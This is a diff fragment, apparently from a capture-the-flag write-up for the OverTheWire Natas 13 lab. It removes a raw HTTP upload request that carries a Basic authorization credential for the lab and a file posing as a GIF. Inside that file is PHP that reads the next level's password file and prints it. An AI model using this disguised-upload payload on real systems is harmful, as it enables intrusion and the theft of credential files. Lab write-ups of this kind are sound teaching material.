@@ -434,27 +434,6 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Referer: http://natas13.natas.labs.overthewire.org/index.php
-Content-Type: multipart/form-data; boundary=---------------------------1096181585261691482202228918
-Content-Length: 625
-Authorization: Basic bmF0YXMxMzpqbUxUWTBxaVBaQmJhS2M5MzQxY3FQUVpCSnY3TVFiWQ==
-Connection: close
-Upgrade-Insecure-Requests: 1
-
-Content-Disposition: form-data; name="MAX_FILE_SIZE"
-
-1000
-
-Content-Disposition: form-data; name="filename"
-
-yzow7qgsuk.php
-
-Content-Disposition: form-data; name="uploadedfile"; filename="poof2.phpA.gif"
-Content-Type: image/gif
-
-GIF89a  ò  KMUUUKV\JWd]W         !þU<?php
-$password = file_get_contents('/etc/natas_webpass/natas14');
-echo $password;
-?> !ù	  ,       8*! $ ;
 
 ```
 
